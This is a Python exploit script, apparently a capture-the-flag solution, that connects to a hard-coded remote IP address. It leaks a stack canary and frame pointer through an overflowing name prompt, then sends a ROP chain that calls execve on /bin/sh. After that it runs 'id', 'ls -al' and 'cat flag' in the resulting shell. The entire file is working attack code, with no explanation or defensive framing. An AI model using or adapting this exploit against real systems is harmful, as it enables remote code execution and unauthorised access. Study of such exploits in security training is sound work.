#!/usr/bin/env python3

import socket
import sys
import random
import binascii
import time
import struct
from collections import defaultdict

BUFSIZE = 2048
DEBUG = False

def readuntil(s,val,slow=False):
	buf = b''
	while not buf.endswith(val):
		if slow:
			ret = s.recv(1)
		else:
			ret = s.recv(BUFSIZE)
		buf = buf + ret
		if DEBUG and len(buf)%1 == 0:
			print(buf[-200:])
		#print(buf.decode('ascii'))
		if len(ret) == 0:
			raise Exception('received zero bytes')
	if DEBUG:
		print(buf)
	return buf

def sendall(s,buf):
	if DEBUG:
		print('>>', buf)
	s.send(buf)

def pwn():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	#s.connect(('127.0.0.1',1223))
	s.connect(('3.93.128.89',1223))

	data1 = binascii.unhexlify('a13c600061e062f063756421653cff55'+'6666'*2+'213c') + b'/bin/sh\x00'

	readuntil(s,b'game: ',slow=True)
	sendall(s,data1)
	readuntil(s,b'servers...\n',slow=True)
	#sendall(s,b'\n')
	vals = defaultdict(lambda:0)
	for i in range(0x18,0x30):
		readuntil(s,b'name: ',slow=True)
		sendall(s,b'A'*i+b'\n')
		res = readuntil(s,b'(y/n): ',slow=True)
		j = res.find(b' would')
		res = res[:j]
		for j in range(i,len(res)):
			vals[j] = res[j]
		print(binascii.hexlify(res))
		sendall(s,b'y\n')

	print(vals)
	canary,ebp = struct.unpack('QQ',bytes([vals[i] for i in range(0x18,0x28)]))
	print(hex(canary))
	print(hex(ebp))

	stack = [0,0,0]
	stack.append(canary)
	stack.append(ebp)
	stack.append(0x000000000044bf1c) # : pop rax ; ret
	stack.append(59)
	stack.append(0x00000000004006a6) # : pop rdi ; ret
	stack.append(0x006dbd4a + 0x200 + len(data1)-8)
	stack.append(0x0000000000412463) # : pop rsi ; ret
	stack.append(0)
	stack.append(0x000000000044bf75) # : pop rdx ; ret
	stack.append(0)
	stack.append(0x0000000000402b2c) # : syscall

	data2 = struct.pack('Q'*len(stack),*tuple(stack))
	print(binascii.hexlify(data2))

	readuntil(s,b'name: ',slow=True)
	sendall(s,data2+b'\n')
	res = readuntil(s,b'(y/n): ',slow=True)
	sendall(s,b'n\n')

	global DEBUG
	DEBUG = True
	time.sleep(1)

	print(s.recv(2048))
	sendall(s,b'id\n')
	print(s.recv(2048))
	sendall(s,b'ls -al\n')
	print(s.recv(2048))
	sendall(s,b'cat flag\n')
	print(s.recv(2048))

if __name__ == '__main__':

	pwn()

